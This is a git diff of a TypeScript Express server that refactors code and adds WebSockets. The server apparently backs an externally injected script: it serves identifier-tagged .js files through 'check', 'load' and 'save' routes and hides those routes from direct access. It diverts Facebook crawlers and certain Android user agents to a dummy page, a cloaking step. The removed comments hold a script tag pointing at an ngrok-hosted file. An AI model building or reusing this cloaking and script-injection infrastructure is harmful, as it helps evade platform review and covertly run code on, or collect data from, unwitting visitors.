@@ -1,23 +1,26 @@
-import cors from 'cors'
+import cors from 'cors';
 import morgan from 'morgan';
 import Routes from './routes/routes.js';
 import * as exphbs from 'express-handlebars';
-import express, { Express } from "express";
+import express, { Express, Request, Response, NextFunction } from 'express';
 import './database/connection.js';
 import { CustomRequest } from './utils/custom.request.interface.js';
 import { allowCheckWords, allowLoadWords, allowSaveWords } from './utils/allowed_words.js';
-
 import path from 'path';
 import { fileURLToPath } from 'url';
+import * as http from 'http';
+import WebSocketPool from './class/websocketPool.js';
+
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
-const FULL_DOM_MODE = true;
-
 // Initializations
 const app: Express = express();
+const server = http.createServer(app);
 
-// Settings npx tsc --watch 
+// Inicializando servidor WebSockets
+WebSocketPool.createWebSocketServer(server);
+
 const port = process.env.PORT || 3000;
 
 // Configura express-handlebars
@@ -35,28 +38,26 @@ app.use(cors());
 app.use(morgan('dev'));
 app.use(express.urlencoded({ extended: false }));
 app.use(express.json());
-
 app.disable('x-powered-by');
 
-// <script src="https://9ee5-152-0-197-114.ngrok-free.app/content/JpcrtaCqzio.js?66ad89928ce1e85a719b561796s58"></script>
+// Middleware para manejo de errores
+app.use((err: any, req: Request, res: Response, next: NextFunction) => {
+    console.error(err.stack);
+    res.status(500).send('Something broke!');
+});
 
-// Middleware para obtener la IP del cliente
-// https://0735-200-88-148-198.ngrok-free.app/content/JpcrtaCqzio.js?66ad89928ce1e85a719b561796s58
-// js, file, files, static, public, content, script, scripts, javascript
-
-const extractDataFromUrl = (url: string): { 
-    fileName  : string; 
+const extractDataFromUrl = (url: string): {
+    fileName: string;
     identifier: string;
-    checkWord : boolean;
-    loadWord  : boolean;
-    saveWord  : boolean;
+    checkWord: boolean;
+    loadWord: boolean;
+    saveWord: boolean;
 } | null => {
-    // Extraer los primeros 24 caracteres del otro fragmento (después del signo de interrogaci
     const identifierMatch = url.match(/\?([a-zA-Z0-9]{24})/);
     if (!identifierMatch) {
         return null;
     }
-    
+
     const allowCheckWord = allowCheckWords.some(word => containsWholeWord(url, word));
     const allowLoadWord  = allowLoadWords.some(word => containsWholeWord(url, word));
     const allowSaveWord  = allowSaveWords.some(word => containsWholeWord(url, word));
@@ -65,26 +66,26 @@ const extractDataFromUrl = (url: string): {
     }
 
     let fileNameMatch: string = "";
-    if(allowCheckWord){
+    if (allowCheckWord) {
         const matchResult = url.match(/\/([a-zA-Z]{11}\.js)\?/);
         if (!matchResult) {
             return null;
         }
         fileNameMatch = matchResult[1];
-    }else if(allowLoadWord){
+    } else if (allowLoadWord) {
         fileNameMatch = "load";
-    }else if(allowSaveWord){
+    } else if (allowSaveWord) {
         fileNameMatch = "save";
-    }else{
+    } else {
         return null;
     }
-    
-    return { 
-        fileName: fileNameMatch, 
+
+    return {
+        fileName: fileNameMatch,
         identifier: identifierMatch[1],
         checkWord: allowCheckWord,
-        loadWord : allowLoadWord,
-        saveWord : allowSaveWord
+        loadWord: allowLoadWord,
+        saveWord: allowSaveWord
     };
 }
 
@@ -92,18 +93,14 @@ const interceptorMiddleware = (req: CustomRequest, res: express.Response, next: 
     const userAgent = req.headers['user-agent'] || "";
     const extractData = extractDataFromUrl(req.url);
 
-    req.headers.fullDomMode = FULL_DOM_MODE;
-
-    // SI ES LA RUTA INICIAR ENVIAR AL CONTROLADOR
     if (req.url === "/") {
         return next();
     }
 
-    // SI CONTIENE UNA DE LAS RUTAS DEVOLVER ERROR
     if (req.url.includes('ehloq-check') ||
         req.url.includes('ehloq-load') ||
         req.url.includes('ehloq-save')) {
-        return res.status(404);
+        return res.status(404).send('Not Found');
     }
 
     if (!extractData) {
@@ -116,8 +113,7 @@ const interceptorMiddleware = (req: CustomRequest, res: express.Response, next: 
         return next();
     }
 
-    // VERIFICADOR DE PALABRAS PROHIBIDAS
-    const forbiddenWordsRegex = /sp1a|width|build|dalvik|height|density|supportsfresco|scaleddensity|displaymetrics|externalhit_uatext|facebookexternalhit|audiencenetworkforwindows/i;
+    const forbiddenWordsRegex = /sp1a|width|dalvik|height|density|supportsfresco|scaleddensity|displaymetrics|externalhit_uatext|facebookexternalhit|audiencenetworkforwindows/i;
     if (forbiddenWordsRegex.test(userAgent)) {
         req.url = '/nofound';
         return next();
@@ -130,12 +126,10 @@ const interceptorMiddleware = (req: CustomRequest, res: express.Response, next: 
     // }
 
     req.headers.identifier = extractData.identifier;
-
     if (req.method === 'GET') {
-        if (extractData.checkWord){
-            req.url = FULL_DOM_MODE ? '/ehloq-check-dom' : '/ehloq-check';
-        }else{
-            console.log("LOAD ROUTESS");
+        if (extractData.checkWord) {
+            req.url = '/ehloq-check';
+        } else {
             req.url = '/ehloq-load';
         }
     } else if (req.method === 'POST') {
@@ -156,6 +150,6 @@ app.use(interceptorMiddleware);
 // Routes
 app.use('/', Routes);
 
-app.listen(port, () => {
+server.listen(port, () => {
     console.log(`[server]: Server is running at http://localhost:${port}`);
 });
